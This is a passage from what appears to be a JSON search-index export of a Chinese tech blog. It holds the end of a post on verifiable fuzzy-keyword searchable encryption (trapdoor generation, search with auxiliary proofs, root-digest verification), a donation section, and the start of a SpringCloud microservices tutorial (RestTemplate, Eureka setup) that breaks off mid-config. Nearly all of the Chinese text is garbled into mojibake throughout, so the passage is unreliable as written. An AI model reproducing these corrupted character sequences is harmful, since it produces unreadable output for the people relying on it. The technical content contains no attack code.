æ‘˜è¦åï¼ŒDOå¯¹å…¶è¿›è¡Œç­¾åä»¥è·å¾— $Sig=sign_{K_{pri}}(d_{root})$\n\n------\n\nä¸¾ä¸ªğŸŒ°ï¼šç»™å®š 5 ä¸ªæ–‡æ¡£  $\\{f_1, f_2, f_3, f_4, f_5\\}$, å…¶ä¸­ $f_1=\\{w_1, w_3\\}$, $f_2=\\{w_1, w_5\\}$, $f_3=\\{w_1, w_3, w_5\\}$, $ f_4=\\{w_2, w_4\\}$, $f_5=\\{w_1, w_2, w_4\\}$\n\n- 1.é¦–å…ˆå°†å®ƒä»¬è½¬æ¢ä¸º 5 ä¸ª TBFï¼Œç„¶åä»¥ 5 ä¸ªTBFä¸ºå¶èŠ‚ç‚¹æ„é€ å¹³è¡¡äºŒå‰ç´¢å¼•æ ‘ï¼Œå®ç°äºšçº¿æ€§æ£€ç´¢ã€‚åœ¨ä½¿ç”¨ MSA å’Œ MHT å¯¹å…¶è¿›è¡Œèº«ä»½éªŒè¯å\n- æ¯ä¸ªéå¶èŠ‚ç‚¹å­˜å‚¨äº”ä¸ªç»„ä»¶ï¼š$<Bï¼ŒP(T)ï¼ŒÎ³ï¼Œaccï¼Œd>$\n  \n- æ¯ä¸ªå¶èŠ‚ç‚¹å¤šå­˜å‚¨ä¸€ä¸ªç»„ä»¶ï¼šå¯†æ–‡ c\n  \n- æ ¹èŠ‚ç‚¹å¤šå­˜å‚¨ä¸€ä¸ªç»„ä»¶ï¼šç­¾å Sig\n- 2.å‡è®¾å…³é”®å­— $w_1$ çš„ Bucket String æ•£åˆ—åˆ°ä½ç½® 1ã€2ã€3ï¼Œå…¶æ ‡ç­¾ $t_1=H_1(1||2||3)$ç±»ä¼¼åœ°ï¼Œ$w_2ã€w_4ã€w_5$ æ ‡ç­¾æ˜¯è®¡ç®— $t_2ã€t_4ã€t_5$\n- 3.å°†å¶èŠ‚ç‚¹ $L_2$ çš„ç´¯ç§¯å€¼å’Œæ‘˜è¦è®¡ç®—ä¸º $acc_2=MSA.Acc({t_1ï¼Œt_5}ï¼Œsk)$ å’Œ $d_2=H_2(c_2||B_2||acc_2)$\n- 4.éå¶èŠ‚ç‚¹ $L_6$ çš„ç´¯ç§¯å€¼å’Œæ‘˜è¦è®¡ç®—ä¸º $acc_6=MSA.Acc({t_1ï¼Œt_2ï¼Œt_4}ï¼Œsk)$ å’Œ $d_6=H_2(H_2(d_4||d_5)||B_6||acc_6)$\n\n------\n\n### â¸TrapGen\n\n> $TrapGen(Q, SK)â†’ {TK, T_Q}$\n\nå¯¹äºæ¯ä¸ªæŸ¥è¯¢å…³é”®å­— $w_i'âˆˆQ$ï¼ŒQU é¦–å…ˆåƒ DO åœ¨æ¨¡ç³Šè®¾ç½®æ­¥éª¤ä¸­ä¸€æ ·å°†å…¶è½¬æ¢ä¸ºBucket String $S_i'$ï¼Œç„¶åå°† $S_i'$ åŠ å¯†ä¸º $tk_i$ï¼Œå¹¶ç”Ÿæˆæ ‡ç­¾ $t_i'$ \n\n$$\ntk_i={(h_1(S_i'), h_{k+1}(h_1(S_i'))),Â·Â·Â·,(h_k(S_i'), h_{k+1}(h_k(S_i')))},\n\\\\\\\\\nt_i'=H_1(h_1(S_i')||Â·Â·Â·||h_k(S_i'))\n$$\nè¿™æ ·ï¼ŒQU å¾—åˆ°é™·é—¨ $TK = \\{tk_1ï¼ŒÂ·Â·Â·ï¼Œtk_q\\}$ å’Œæ ‡ç­¾é›† $T_Q=\\{t_1'ï¼ŒÂ·Â·Â·ï¼Œt_q' \\}$ï¼Œå…¶ä¸­$q$ ä¸ºæœç´¢æŸ¥è¯¢ $Q$ ä¸­åŒ…å«çš„æŸ¥è¯¢å…³é”®è¯çš„ä¸ªæ•°\n\n### â¹Search\n\n> $Search(I, TK, T_Q, PP)â†’ \\{R, AP\\}$\n\n![](https://img.jwt1399.top/img/202209282044990.png)\n\næ”¶åˆ°æœç´¢è¯·æ±‚ $TK = \\{tk_1ï¼ŒÂ·Â·Â·ï¼Œtk_q\\}$ åï¼ŒCSP ä»æ ¹èŠ‚ç‚¹æ£€ç´¢ç»è¿‡èº«ä»½éªŒè¯çš„ç´¢å¼•æ ‘ $I$ï¼Œé€šè¿‡ $Algorithm \\ 3$ æŸ¥æ‰¾åŒ…å«æ‰€æœ‰æŸ¥è¯¢å…³é”®å­—çš„å¶èŠ‚ç‚¹\n\n- ä»æ ¹èŠ‚ç‚¹å¼€å§‹ï¼ŒCSP æ£€æŸ¥å½“å‰èŠ‚ç‚¹ node æ˜¯å¦åŒ…å«æ‰€æœ‰æŸ¥è¯¢å…³é”®å­—(ç¬¬1-8è¡Œ)\n\n- å¦‚æœ $node.B[h_Î¹(S_i')][H(h_{k+1}(h_Î¹(S_i'))âŠ•node.Î³)] = 1$ é€‚ç”¨äº $âˆ€Î¹ âˆˆ [1,k]ï¼Œ iâˆˆ[1,q]$ï¼Œåˆ™è¿”å›1ï¼Œè¡¨ç¤ºè¯¥èŠ‚ç‚¹åŒ…å«æ‰€æœ‰æŸ¥è¯¢å…³é”®å­—ã€‚\n- ç„¶åï¼ŒCSP æ£€æŸ¥å½“å‰èŠ‚ç‚¹ node æ˜¯å¦æ˜¯å¶å­èŠ‚ç‚¹ã€‚å¦‚æœæ˜¯ï¼ŒCSPå°†ç›¸åº”çš„å¯†æ–‡ $c_i$ æ·»åŠ åˆ°æœç´¢ç»“æœé›† $R$ (ç¬¬10-11è¡Œ)\n\n- ä¹‹åï¼ŒCSP æ·»åŠ å…ƒç»„ $âŸ¨node.B, node.accâŸ©$ åˆ°è¾…åŠ©è¯æ˜é›† $AP$ï¼Œå¹¶ä»¥ç›¸åŒçš„æ–¹å¼å¤„ç†å…¶å·¦å³å­æ ‘(ç¬¬12-14è¡Œ)\n- å¦‚æœ $âˆƒiâˆˆ[1, q], Î¹âˆˆ[1, k], node.B[h_Î¹(S_i')][H(h_{k+1}(h_Î¹(S_i'))âŠ•node.Î³)] = 0$ï¼Œå®ƒè¿”å›æ ‡ç­¾  $t_i'$ ï¼Œè¡¨ç¤ºè¯¥ node ä¸åŒ…å«æŸ¥è¯¢å…³é”®å­— $w_i'$ã€‚\n- ç„¶å, CSP è¿è¡Œ$MSA.PDisjoint$ ä¸ºå½“å‰èŠ‚ç‚¹ node å’ŒæŸ¥è¯¢å…³é”®å­— $w_i'$ ç”Ÿæˆä¸åŒ¹é…è¯æ˜ $\\pi$ï¼Œå¹¶æ·»åŠ å…ƒç»„ $âŸ¨node.d, node.acc, t_i', Ï€âŸ©$ åˆ° $AP$ (ç¬¬16-17è¡Œ)\n\n------\n\nğŸ™‹ğŸ»â€â™‚ï¸ğŸŒ°ï¼šå½“æŸ¥è¯¢ä¸º $Q=\\{w_1ï¼Œw_3\\}$ æ—¶è¾…åŠ©è¯æ˜é›†çš„ç¤ºä¾‹\n\n- åœ¨ 5 ä¸ªæ–‡æ¡£ä¸­ï¼Œåªæœ‰æ–‡æ¡£ $f_1ã€f_3$ åŒ…å«è¿™ä¸¤ä¸ªå…³é”®å­—ã€‚\n\n- å› æ­¤ï¼Œè¿”å› $c_1ã€c_3$ ä½œä¸ºæœç´¢ç»“æœ\n- è¾…åŠ©è¯æ˜é›† $AP$ ç”±æœç´¢è·¯å¾„ä¸Šå„èŠ‚ç‚¹çš„ TBF $B_i$ å’Œç´¯ç§¯å€¼ $acc$ã€æœç´¢è·¯å¾„å¤–å„èŠ‚ç‚¹çš„æ‘˜è¦ $d_i$ ã€ç´¯ç§¯å€¼ $acc$ã€ä¸åŒ¹é…æ ‡è®° $t_i'$ å’Œä¸åŒ¹é…è¯æ˜ $\\pi$ ä»¥åŠç­¾å Sig ç»„æˆã€‚\n\n![](https://img.jwt1399.top/img/202209282044090.png)\n\n### âºVerify\n\n> $Verify(R, AP, PP, SK)â†’1/0$\n\nä½¿ç”¨è¾…åŠ©è¯æ˜é›† $AP$ï¼ŒéªŒè¯è€…é¦–å…ˆè¿è¡Œ $MSA.VDisjoint$ æ£€æŸ¥æœç´¢æŸ¥è¯¢ $Q$ æ˜¯å¦ç¡®å®ä¸æœªè¿”å›çš„æ–‡æ¡£ä¸åŒ¹é…ï¼Œç„¶åé‡æ„æœ€å°è®¤è¯æ ‘ï¼Œå¹¶å°†å…¶ $root$ æ‘˜è¦ä¸åŸå§‹ $root$ æ‘˜è¦è¿›è¡Œæ¯”è¾ƒï¼Œä»¥éªŒè¯æœç´¢ç»“æœçš„æ­£ç¡®æ€§å’Œå®Œæ•´æ€§ã€‚\n\nåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼ŒéªŒè¯è€…é¦–å…ˆæ£€æŸ¥å…¬å¼ 14ï¼Œä»¥è¯æ˜æ–‡æ¡£ $f_2, f_4, f_5$ ä¸åŒ…å«æŸ¥è¯¢å…³é”®å­— $w_3$ï¼Œè¿™ç¡®å®ä¸æœç´¢æŸ¥è¯¢ $Q=\\{w_1, w_3\\}$ ä¸åŒ¹é…ã€‚\n\nç„¶åéªŒè¯è€…ä½¿ç”¨å¯¹åº”çš„å…¬é’¥å¯¹ç­¾å $Sig$ è¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°åŸå§‹æ ¹æ‘˜è¦ $d_{root}$ï¼Œå³ $d_{root}=ver_{K_{pub}}(Sig)$ã€‚æœ€åï¼ŒéªŒè¯è€…é‡æ–°è®¡ç®—å…¬å¼15ä¸­çš„æ ¹æ‘˜è¦ $d_{root}'$ï¼Œå¹¶å°†å…¶ä¸æ ¹è¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœå®ƒä»¬ç›¸ç­‰ï¼Œåˆ™æœç´¢ç»“æœæ˜¯æ­£ç¡®å’Œå®Œæ•´çš„\n\n$$\nMSA.VDisjoint(acc_2,MSA.Acc(t_3, sk), Ï€_2, sk) = 1\n\\\\\\\\\nMSA.VDisjoint(acc_6,MSA.Acc(t_3, sk), Ï€_6, sk) = 1\n$$\n\n$$\nd_i'=H_2(c_i||B_i||acc_i), i= 1,3\n\\\\\\\\\nd_7'=H_2(H_2(d_3'||d_2)||B_7||acc_7)\n\\\\\\\\\nd_8'=H_2(H_2(d_7'||d_1')||B_8||acc_8)\n\\\\\\\\\nd_{root}'=H_2(H_2(d_8'||d_6)||B_{root}||acc_{root})\n$$\n\n\n\n\n\n\n\n## Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["å¯æœç´¢åŠ å¯†"],"categories":["Crypto"]},{"title":"SpringCloud-å®ç”¨ç¯‡","url":"/posts/42622.html","content":"\n> å®ç”¨ç¯‡åŒ…å«å¾®æœåŠ¡æ²»ç†(æ³¨å†Œå‘ç°ï¼Œè¿œç¨‹è°ƒç”¨ï¼Œé…ç½®ç®¡ç†ï¼Œç½‘å…³è·¯ç”±)ã€DockeræŠ€æœ¯ã€å¼‚æ­¥é€šä¿¡ã€åˆ†å¸ƒå¼ç¼“å­˜ã€åˆ†å¸ƒå¼æœç´¢\n\nå°ç®€ä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ä¹‹ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html) ä¸­çš„ã€ŠSpringCloud-å®ç”¨ç¯‡ã€‹ï¼Œä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šé¢„è®¡10å¤©æ›´æ–°å®Œ\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š09-20\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼š09-30\n- [x] ğŸ€æ€»ç»“ï¼š\n\n| ![å­¦ä¹ å®‰æ’](https://img.jwt1399.top/img/202209201412578.png) |\n| ------------------------------------------------------------ |\n| ![æŠ€æœ¯åˆ†ç±»](https://img.jwt1399.top/img/202209201436751.png) |\n\n#  1.å¾®æœåŠ¡\n\n## â‘ æ¶æ„å¯¹æ¯”\n\n| `æ¶æ„`     | `å•ä½“æ¶æ„`                                             | `åˆ†å¸ƒå¼æ¶æ„`                                                 |\n| ---------- | ------------------------------------------------------ | ------------------------------------------------------------ |\n| **`æè¿°`** | å°†ä¸šåŠ¡çš„æ‰€æœ‰åŠŸèƒ½é›†ä¸­åœ¨ä¸€ä¸ªé¡¹ç›®ä¸­å¼€å‘ï¼Œæ‰“æˆä¸€ä¸ªåŒ…éƒ¨ç½²ã€‚ | æ ¹æ®ä¸šåŠ¡åŠŸèƒ½å¯¹ç³»ç»Ÿåšæ‹†åˆ†ï¼Œæ¯ä¸ªä¸šåŠ¡åŠŸèƒ½æ¨¡å—ä½œä¸ºç‹¬ç«‹é¡¹ç›®å¼€å‘ã€‚ |\n| **`å›¾ç¤º`** | ![](https://img.jwt1399.top/img/202209201338897.png)   | ![](https://img.jwt1399.top/img/202209201338887.png)         |\n| **`ä¼˜ç‚¹`** | æ¶æ„ç®€å•ã€éƒ¨ç½²æˆæœ¬ä½                                   | é™ä½æœåŠ¡è€¦åˆã€æœ‰åˆ©äºæœåŠ¡å‡çº§å’Œæ‹“å±•                           |\n| **`ç¼ºç‚¹`** | è€¦åˆåº¦é«˜ï¼ˆç»´æŠ¤å›°éš¾ã€å‡çº§å›°éš¾ï¼‰                         | æœåŠ¡è°ƒç”¨å…³ç³»é”™ç»¼å¤æ‚                                         |\n\nåˆ†å¸ƒå¼æ¶æ„è™½ç„¶é™ä½äº†æœåŠ¡è€¦åˆï¼Œä½†æ˜¯æœåŠ¡æ‹†åˆ†æ—¶ä¹Ÿæœ‰å¾ˆå¤šé—®é¢˜éœ€è¦æ€è€ƒï¼š\n\n- æœåŠ¡æ‹†åˆ†çš„ç²’åº¦å¦‚ä½•ç•Œå®šï¼Ÿ\n- æœåŠ¡é›†ç¾¤åœ°å€å¦‚ä½•ç»´æŠ¤ï¼Ÿ\n- æœåŠ¡çš„è°ƒç”¨å…³ç³»å¦‚ä½•ç®¡ç†ï¼Ÿ\n- æœåŠ¡å¥åº·çŠ¶æ€å¦‚ä½•æ„ŸçŸ¥ï¼Ÿ\n\näººä»¬éœ€è¦åˆ¶å®šä¸€å¥—è¡Œä¹‹æœ‰æ•ˆçš„æ ‡å‡†æ¥çº¦æŸåˆ†å¸ƒå¼æ¶æ„ã€‚å› æ­¤å¾®æœåŠ¡æ¥å•¦ï¼ï¼ï¼\n\n## â‘¡å¾®æœåŠ¡ç®€ä»‹\n\n**å¾®æœåŠ¡çš„æ¶æ„ç‰¹å¾ï¼š**\n\n- å•ä¸€èŒè´£ï¼šå¾®æœåŠ¡æ‹†åˆ†ç²’åº¦æ›´å°ï¼Œæ¯ä¸€ä¸ªæœåŠ¡éƒ½å¯¹åº”å”¯ä¸€çš„ä¸šåŠ¡èƒ½åŠ›ï¼Œåšåˆ°å•ä¸€èŒè´£\n- è‡ªæ²»ï¼šå›¢é˜Ÿç‹¬ç«‹ã€æŠ€æœ¯ç‹¬ç«‹ã€æ•°æ®ç‹¬ç«‹ï¼Œç‹¬ç«‹éƒ¨ç½²å’Œäº¤ä»˜\n- é¢å‘æœåŠ¡ï¼šæœåŠ¡æä¾›ç»Ÿä¸€æ ‡å‡†çš„æ¥å£ï¼Œä¸è¯­è¨€å’ŒæŠ€æœ¯æ— å…³\n- éš”ç¦»æ€§å¼ºï¼šæœåŠ¡è°ƒç”¨åšå¥½éš”ç¦»ã€å®¹é”™ã€é™çº§ï¼Œé¿å…å‡ºç°çº§è”é—®é¢˜\n\nå¾®æœåŠ¡çš„ä¸Šè¿°ç‰¹æ€§å…¶å®æ˜¯åœ¨ç»™åˆ†å¸ƒå¼æ¶æ„åˆ¶å®šä¸€ä¸ªæ ‡å‡†ï¼Œè¿›ä¸€æ­¥é™ä½æœåŠ¡ä¹‹é—´çš„è€¦åˆåº¦ï¼Œæä¾›æœåŠ¡çš„ç‹¬ç«‹æ€§å’Œçµæ´»æ€§ã€‚åšåˆ°é«˜å†…èšï¼Œä½è€¦åˆã€‚å› æ­¤**å¾®æœåŠ¡**æ˜¯ä¸€ç§ç»è¿‡è‰¯å¥½æ¶æ„è®¾è®¡çš„**åˆ†å¸ƒå¼æ¶æ„æ–¹æ¡ˆ** ã€‚\n\n\n\n![å¾®æœåŠ¡æ¶æ„](https://img.jwt1399.top/img/202209201355158.png)\n\nä½†æ–¹æ¡ˆè¯¥æ€ä¹ˆè½åœ°ï¼Ÿé€‰ç”¨ä»€ä¹ˆæ ·çš„æŠ€æœ¯æ ˆï¼Ÿå…¶ä¸­åœ¨Javaé¢†åŸŸæœ€å¼•äººæ³¨ç›®çš„å°±æ˜¯SpringCloudæä¾›çš„æ–¹æ¡ˆäº†ã€‚\n\n## â‘¢å¾®æœåŠ¡æ–¹æ¡ˆ\n\nç›®å‰å›½å†…ä½¿ç”¨æœ€å¹¿æ³›çš„å¾®æœåŠ¡æ–¹æ¡ˆï¼šDubboã€SpringCloudã€SpringCloudAlibaba\n\n![æ–¹æ¡ˆå¯¹æ¯”](https://img.jwt1399.top/img/202209201416386.png)\n\n![](https://img.jwt1399.top/img/202209201419610.png)\n\n## â‘¤æ¡ˆä¾‹å¼•å…¥\n\n> ä¸‹æ–¹çš„è®²è§£éƒ½åŸºäºæ­¤æ¡ˆä¾‹è¿›è¡Œï¼Œè¯·æå‰æ­å»ºå¥½æ­¤é¡¹ç›®ã€‚[é¡¹ç›®cloud-demo](https://jwt1399.lanzouv.com/b01dymdva) å¯†ç :1399\n>\n> æ­å»ºæ–¹å¼ï¼š1.ä½¿ç”¨IDEA æ‰“å¼€ cloud-demoé¡¹ç›® 2.åˆ›å»ºä¸¤ä¸ªæ•°æ®åº“`cloud_order`å’Œ`cloud_user `3.å°†æä¾›çš„`cloud-order.sql`å’Œ`cloud-user.sql`å¯¼å…¥å¯¹åº”åº“ä¸­ 4.ä¿®æ”¹é¡¹ç›®ä¸­æ•°æ®åº“å¯†ç \n\n**é¡¹ç›®ç»“æ„ï¼š**\n\n```bash\ncloud-demo  # çˆ¶å·¥ç¨‹ï¼Œç®¡ç†ä¾èµ–\nâ”œâ”€â”€ order-service # è®¢å•å¾®æœåŠ¡ï¼Œè´Ÿè´£è®¢å•ç›¸å…³ä¸šåŠ¡\nâ””â”€â”€ user-service  # ç”¨æˆ·å¾®æœåŠ¡ï¼Œè´Ÿè´£ç”¨æˆ·ç›¸å…³ä¸šåŠ¡\n```\n\n**é¡¹ç›®ç‰¹å¾ï¼š**\n\n- è®¢å•å¾®æœåŠ¡å’Œç”¨æˆ·å¾®æœåŠ¡æœ‰å„è‡ªçš„æ•°æ®åº“ï¼Œç›¸äº’ç‹¬ç«‹\n- è®¢å•æœåŠ¡å’Œç”¨æˆ·æœåŠ¡éƒ½å¯¹å¤–æš´éœ²Restfulçš„æ¥å£\n- è®¢å•æœåŠ¡å¦‚æœéœ€è¦æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ï¼Œåªèƒ½è°ƒç”¨ç”¨æˆ·æœåŠ¡çš„Restfulæ¥å£ï¼Œä¸èƒ½æŸ¥è¯¢ç”¨æˆ·æ•°æ®åº“\n\n**åŸºç¡€æ¦‚å¿µï¼š**\n\nåœ¨æœåŠ¡è°ƒç”¨å…³ç³»ä¸­ï¼Œä¼šæœ‰ä¸¤ä¸ªä¸åŒçš„è§’è‰²ï¼š\n\n- **æœåŠ¡æä¾›è€…**ï¼šä¸€æ¬¡ä¸šåŠ¡ä¸­ï¼Œè¢«å…¶å®ƒå¾®æœåŠ¡è°ƒç”¨çš„æœåŠ¡ã€‚ï¼ˆæä¾›æ¥å£ç»™å…¶å®ƒå¾®æœåŠ¡ï¼‰\n\n- **æœåŠ¡æ¶ˆè´¹è€…**ï¼šä¸€æ¬¡ä¸šåŠ¡ä¸­ï¼Œè°ƒç”¨å…¶å®ƒå¾®æœåŠ¡çš„æœåŠ¡ã€‚ï¼ˆè°ƒç”¨å…¶å®ƒå¾®æœåŠ¡æä¾›çš„æ¥å£ï¼‰\n\n- æœåŠ¡æä¾›è€…ä¸æœåŠ¡æ¶ˆè´¹è€…çš„è§’è‰²å¹¶ä¸æ˜¯ç»å¯¹çš„ï¼Œè€Œæ˜¯ç›¸å¯¹äºä¸šåŠ¡è€Œè¨€ã€‚\n\n![](https://img.jwt1399.top/img/202209202043982.png)\n\n**ç›®å‰éœ€æ±‚ï¼š**ä¿®æ”¹order-serviceä¸­çš„æŸ¥è¯¢è®¢å•ä¸šåŠ¡ï¼Œè¦æ±‚åœ¨æŸ¥è¯¢è®¢å•çš„åŒæ—¶ï¼Œæ ¹æ®è®¢å•ä¸­åŒ…å«çš„userIdæŸ¥è¯¢å‡ºç”¨æˆ·ä¿¡æ¯ï¼Œä¸€èµ·è¿”å›ã€‚\n\n![](https://img.jwt1399.top/img/202209202020487.png)\n\n# 2.æœåŠ¡è¿œç¨‹è°ƒç”¨â‘ \n\n## â‘ RestTemplate\n\nè¦å®ç°ä¸Šæ–¹éœ€æ±‚ï¼Œæˆ‘ä»¬éœ€è¦åœ¨order-serviceä¸­å‘user-serviceå‘èµ·ä¸€ä¸ªhttpçš„è¯·æ±‚ï¼Œè°ƒç”¨`http://localhost:8081/user/{userId}`æ¥å£ã€‚\n\næ­¥éª¤å¦‚ä¸‹ï¼š\n\n- æ³¨å†Œä¸€ä¸ªRestTemplateçš„å®ä¾‹åˆ°Springå®¹å™¨\n- ä¿®æ”¹order-serviceæœåŠ¡ä¸­çš„OrderServiceç±»ä¸­çš„queryOrderByIdæ–¹æ³•ï¼Œæ ¹æ®Orderå¯¹è±¡ä¸­çš„userIdæŸ¥è¯¢User\n- å°†æŸ¥è¯¢çš„Userå¡«å……åˆ°Orderå¯¹è±¡ï¼Œä¸€èµ·è¿”å›\n\n**æ­¥éª¤ä¸€ï¼šæ³¨å†ŒRestTemplate**\n\n```java\n@MapperScan(\"cn.xxxx.order.mapper\")\n@SpringBootApplication\npublic class OrderApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(OrderApplication.class, args);\n    }\n\n    @Bean\n    public RestTemplate restTemplate() {\n        return new RestTemplate();\n    }\n}\n```\n\n**æ­¥éª¤äºŒï¼šå®ç°è¿œç¨‹è°ƒç”¨**\n\n```java\n@Service\npublic class OrderService {\n\n    @Autowired\n    private OrderMapper orderMapper;\n  \n    @Autowired\n    private RestTemplate restTemplate \n\n    public Order queryOrderById(Long orderId) {\n        // 1.æŸ¥è¯¢è®¢å•\n        Order order = orderMapper.findById(orderId);\n        // 2.è¿œç¨‹æŸ¥è¯¢user\n        // 2.1 urlåœ°å€\n        String url = \"http://localhost:8081/user/\" + order.getUserId();\n        // 2.2 å‘èµ·è°ƒç”¨\n        User user = restTemplate.getForObject(url, User.class);\n        // 3.å­˜å…¥order\n        order.setUser(user);\n        // 4.è¿”å›\n        return order;\n    }\n}\n```\n\n# 3.æœåŠ¡æ³¨å†Œå‘ç°\n\n## â‘ Eureka\n\n> å‡å¦‚æˆ‘ä»¬çš„æœåŠ¡æä¾›è€…user-serviceéƒ¨ç½²äº†å¤šä¸ªå®ä¾‹ï¼Œå¦‚å›¾ï¼š\n>\n> <img src=\"https://img.jwt1399.top/img/202209202108940.png\" style=\"zoom: 25%;\" />\n>\n> æ€è€ƒå‡ ä¸ªé—®é¢˜ï¼š\n>\n> - order-serviceåœ¨å‘èµ·è¿œç¨‹è°ƒç”¨çš„æ—¶å€™ï¼Œè¯¥å¦‚ä½•å¾—çŸ¥user-serviceå®ä¾‹çš„ipåœ°å€å’Œç«¯å£ï¼Ÿ\n> - æœ‰å¤šä¸ªuser-serviceå®ä¾‹åœ°å€ï¼Œorder-serviceè°ƒç”¨æ—¶è¯¥å¦‚ä½•é€‰æ‹©ï¼Ÿ\n> - order-serviceå¦‚ä½•å¾—çŸ¥æŸä¸ªuser-serviceå®ä¾‹æ˜¯å¦ä¾ç„¶å¥åº·ï¼Œæ˜¯ä¸æ˜¯å·²ç»å®•æœºï¼Ÿ\n\n### â¶EurekaåŸç†åˆ†æ\n\nè¿™äº›é—®é¢˜éƒ½éœ€è¦åˆ©ç”¨SpringCloudä¸­çš„æ³¨å†Œä¸­å¿ƒæ¥è§£å†³ï¼Œå…¶ä¸­æœ€å¹¿ä¸ºäººçŸ¥çš„æ³¨å†Œä¸­å¿ƒå°±æ˜¯Eurekaï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼š\n\n![](https://img.jwt1399.top/img/202209202112546.png)\n\né—®é¢˜1ï¼šorder-serviceå¦‚ä½•å¾—çŸ¥user-serviceå®ä¾‹åœ°å€ï¼Ÿ\n\n- user-serviceæœåŠ¡å®ä¾‹å¯åŠ¨åï¼Œå°†è‡ªå·±çš„ä¿¡æ¯æ³¨å†Œåˆ°eureka-serverï¼ˆEurekaæœåŠ¡ç«¯ï¼‰ã€‚è¿™ä¸ªå«æœåŠ¡æ³¨å†Œ\n- eureka-serverä¿å­˜æœåŠ¡åç§°åˆ°æœåŠ¡å®ä¾‹åœ°å€åˆ—è¡¨çš„æ˜ å°„å…³ç³»\n- order-serviceæ ¹æ®æœåŠ¡åç§°ï¼Œæ‹‰å–å®ä¾‹åœ°å€åˆ—è¡¨ã€‚è¿™ä¸ªå«æœåŠ¡å‘ç°æˆ–æœåŠ¡æ‹‰å–\n\né—®é¢˜2ï¼šorder-serviceå¦‚ä½•ä»å¤šä¸ªuser-serviceå®ä¾‹ä¸­é€‰æ‹©å…·ä½“çš„å®ä¾‹ï¼Ÿ\n\n- order-serviceä»å®ä¾‹åˆ—è¡¨ä¸­åˆ©ç”¨è´Ÿè½½å‡è¡¡ç®—æ³•é€‰ä¸­ä¸€ä¸ªå®ä¾‹åœ°å€\n- å¹¶å‘è¯¥å®ä¾‹åœ°å€å‘èµ·è¿œç¨‹è°ƒç”¨\n\né—®é¢˜3ï¼šorder-serviceå¦‚ä½•å¾—çŸ¥æŸä¸ªuser-serviceå®ä¾‹æ˜¯å¦ä¾ç„¶å¥åº·ï¼Œæ˜¯ä¸æ˜¯å·²ç»å®•æœºï¼Ÿ\n\n- user-serviceä¼šæ¯éš”ä¸€æ®µæ—¶é—´ï¼ˆé»˜è®¤30ç§’ï¼‰å‘eureka-serverå‘èµ·è¯·æ±‚ï¼ŒæŠ¥å‘Šè‡ªå·±çŠ¶æ€ï¼Œç§°ä¸ºå¿ƒè·³\n- å½“è¶…è¿‡ä¸€å®šæ—¶é—´æ²¡æœ‰å‘é€å¿ƒè·³æ—¶ï¼Œeureka-serverä¼šè®¤ä¸ºå¾®æœåŠ¡å®ä¾‹æ•…éšœï¼Œå°†è¯¥å®ä¾‹ä»æœåŠ¡åˆ—è¡¨ä¸­å‰”é™¤\n- order-serviceæ‹‰å–æœåŠ¡æ—¶ï¼Œå°±èƒ½å°†æ•…éšœå®ä¾‹æ’é™¤äº†\n\n![ä½¿ç”¨æ­¥éª¤](https://img.jwt1399.top/img/202209202118474.png)\n\n### â·æ­å»ºeureka-server\n\n**æ­¥éª¤ä¸€ï¼šåˆ›å»ºeureka-serveræ¨¡å—**\n\nåœ¨cloud-demoçˆ¶å·¥ç¨‹ä¸‹ï¼Œåˆ›å»ºä¸€ä¸ªmavenå­æ¨¡å— eureka-server\n\n**æ­¥éª¤äºŒï¼šå¼•å…¥eurekaä¾èµ–**\n\n```xml\n<dependency>\n    <groupId>org.springframework.cloud</groupId>\n    <artifactId>spring-cloud-starter-netflix-eureka-server</artifactId>\n</dependency>\n```\n\n**æ­¥éª¤ä¸‰ï¼šç¼–å†™å¯åŠ¨ç±»**\n\nç¼–å†™ä¸€ä¸ªå¯åŠ¨ç±»ï¼Œæ·»åŠ `@EnableEurekaServer`æ³¨è§£ï¼Œå¼€å¯eurekaçš„æ³¨å†Œä¸­å¿ƒåŠŸèƒ½\n\n```java\n@EnableEurekaServer\n@SpringBootApplication\npublic class EurekaApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(EurekaApplication.class, args);\n    }\n}\n```\n\n**æ­¥éª¤å››ï¼šç¼–å†™é…ç½®æ–‡ä»¶**\n\n```yaml\nserver:\n  port: 10086\nspring:\n  application:\n    name: eureka-server\neureka:\n  client:\n    service-url: \n      defaultZone: 